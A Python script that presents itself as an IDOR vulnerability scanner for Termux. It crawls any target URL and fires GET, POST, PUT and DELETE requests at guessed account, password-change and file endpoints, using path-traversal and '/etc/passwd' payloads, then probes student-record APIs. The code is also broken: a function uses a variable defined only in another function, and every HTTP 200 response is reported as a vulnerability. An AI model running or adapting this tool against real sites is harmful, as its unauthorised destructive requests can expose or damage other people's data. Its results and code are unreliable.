import os, sys, time, socket, argparse, zipfile, requests
from os import popen, system
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# COLOURS

from colorama import Fore, Back, Style

red = Fore.RED + Style.BRIGHT
green = Fore.GREEN + Style.BRIGHT
yellow = Fore.YELLOW + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
purple = Fore.MAGENTA + Style.BRIGHT
cyan = Fore.CYAN + Style.BRIGHT
white = Fore.WHITE + Style.BRIGHT
no_colour = Fore.RESET + Back.RESET + Style.RESET_ALL

# SYMBOLS

ask = green + "[" + white + "?" + green + "] " + blue
success = yellow + "[" + white + "√" + yellow + "] " + green
error = blue + "[" + white + "!" + blue + "] " + red
info = yellow + "[" + white + "+" + yellow + "] " + cyan
info2 = green + "[" + white + "•" + green + "] " + purple

# Print logo
def logo_print(n):
    for word in n + "\n":
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.01)


# Print lines
def line_print(n):
    for word in n + "\n":
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(0.05)

#Logo banner
banner = f"""
{red}      ________  ____  ____     _____   __
{cyan}    /  _/ __ \/ __ \/ __ \   /  _/ | / /
{yellow}  / // / / / / / / /_/ /   / //  |/ / 
{blue}  _/ // /_/ / /_/ / _, _/  _/ // /|  /  
{red} /___/_____/\____/_/ |_|  /___/_/ |_/ 
{blue}A IDOR Vulnerability Scanner Tool For Termux
{red}  Made With L3v By @GManOfficial
{yellow}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """


def logo():
    global banner
    split_banner = banner.split("\n")
    for line_number in range(len(split_banner)):
        centre_banner = (split_banner[line_number]).center(
            os.get_terminal_size().columns - 4
        )
        print(centre_banner)

   

def exit_msg():
  line_print("\n" + info2 + green + "Thanks for using IDOR In!\n" + no_colour)
  os.system("clear")
  exit(0)
# Define the endpoint or URL where the IDOR vulnerability might exist
endpoints = [
    "/myaccount/uid=12",
    "User/Login",
    "/photos/002548",
    "/item/193422",
    "/app/accountInfo?acct=admin",
    "/transaction.php?id=74656",
    "/change_password.php?userid=1701",
    "/display_file.php?file.txt",
    "/balance?acc=123",
    "/changepassword?user=someuser",
    "/showImage?img=img00011",
    "/accessPage?menuitem=12",
    "/accountInfo/accId=2",
    "/testpage?invoiceId=12345",
    "/app/accountInfo?act=requestor"
]

# Define the parameter that could potentially be manipulated
parameters = [
    "use", "id", "userid", "username", "user", "blog", "post", "info", "profile", "obj", "object", "query",
    "create", "delete", "edit", "retrieve", "get", "put", "patch", "del", ":id"
]

# Define a dictionary of headers if needed
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Accept": "application/json"
}

# Define a list of test values to be used for the parameter
test_values = ["1", "2", "3", "4"]

# Define a list of additional payloads for parameter fuzzing
payloads = ["../", "/etc/passwd", "admin"]

# Define a list of HTTP methods to be tested
http_methods = ["GET", "POST", "PUT", "DELETE"]

# Define a list of sensitive data endpoints to be checked in the response
sensitive_endpoints = [
    "/api/grades",
    "/api/student_info",
    "/api/attendance",
    "/api/exam_results"
]

visited_urls = set()

def crawl(url, base_url):
    visited_urls.add(url)
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")

    # Extract all links from the current page
    for link in soup.find_all("a"):
        href = link.get("href")
        if href and href.startswith(base_url) and href not in visited_urls:
            crawl(href, base_url)

def test_request(url, method):
    try:
        response = requests.request(method, url, headers=headers)
        return response.status_code, response.text
    except requests.RequestException as e:
        return None, str(e)

def analyze_response(url, method, status_code, response_text):
    if status_code == 200:
        print(success + f"Potential IDOR vulnerability found for URL: {url} | Method: {method} | Status Code: {status_code}")

        for sensitive_endpoint in sensitive_endpoints:
            sensitive_url = urljoin(base_url, sensitive_endpoint)
            sensitive_status_code, sensitive_response_text = test_request(sensitive_url, "GET")

            if sensitive_status_code == 200:
                print(success + f"Sensitive data accessed at endpoint: {sensitive_endpoint} | URL: {sensitive_url}")
            else:
                print(error + f"No sensitive data accessed at endpoint: {sensitive_endpoint}")
    else:
        print(error + f"No IDOR vulnerability found for URL: {url} | Method: {method} | Status Code: {status_code}")

def main():
    target_url = input(ask + "Enter Your Target's URL: ")
    base_url = f"{target_url}"
    start_url = base_url + "/"
    # Start crawling and spidering from the initial URL
    crawl(start_url, base_url)

    # Make requests with different parameter values, payloads, methods, headers, and analyze the responses
    for url in visited_urls:
        for endpoint in endpoints:
            for parameter in parameters:
                for value in test_values + payloads:
                    for method in http_methods:
                        # Craft the request URL with the modified endpoint and parameter value
                        url_with_param = urljoin(url, endpoint) + "?" + parameter + "=" + value

                        status_code, response_text = test_request(url_with_param, method)
                        analyze_response(url_with_param, method, status_code, response_text)

if __name__ == '__main__':
  try:
     os.system("clear")
     logo()
     main()

  except KeyboardInterrupt:
    exit_msg()
